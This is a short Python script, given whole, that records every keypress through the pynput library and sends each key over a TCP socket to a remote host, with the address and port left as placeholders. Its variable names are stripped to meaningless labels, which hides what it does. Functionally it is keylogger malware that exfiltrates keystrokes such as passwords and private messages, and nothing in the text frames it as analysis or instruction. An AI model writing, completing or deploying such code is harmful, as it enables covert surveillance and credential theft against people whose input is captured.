######
import socket as s1
from pynput.keyboard import Key as s5
from pynput.keyboard import Listener as s6

s2 = 'IP'
s3 = <port>

s4 = s1.socket(s1.AF_INET, s1.SOCK_STREAM)

s4.connect((s2, s3))

def s7(data):
    s4.send(data.encode())

def s8(key):
    s7(str(key))

    if key == s5.esc:
        s6.stop()
        s4.close()

with s6(on_press=s8) as s9:
    s9.join()